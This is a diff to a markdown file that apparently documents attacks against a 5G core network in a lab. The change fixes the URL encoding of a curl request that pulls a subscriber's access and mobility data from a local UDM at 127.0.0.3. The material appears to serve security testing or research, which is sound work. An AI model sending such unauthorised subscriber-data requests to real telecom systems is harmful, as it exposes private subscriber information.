@@ -68,7 +68,7 @@ This attack is performed identically to *AMFLookingForUDM* except the `target-nf
 ### GetUserData
 This attack requests information from the UDM regarding a user with `subscriberID=0000000003`. This attack  was performed with:  
 ```
-curl "http://127.0.0.3:8000/nudm-dm/v1/imsi-20893${subscriberID}/am-data?plmn-id=%7B\%22mcc\%22\%3A\%22208\%22\%2C\%22mnc\%22\%3A\%2293\%22\%7D"
+curl "http://127.0.0.3:8000/nudm-dm/v1/imsi-20893${subscriberID}/am-data?plmn-id=%7B%22mcc%22%3A%22208%22%2C%22mnc%22%3A%2293%22%7D"
 ```
 
 ### randomDataDump    
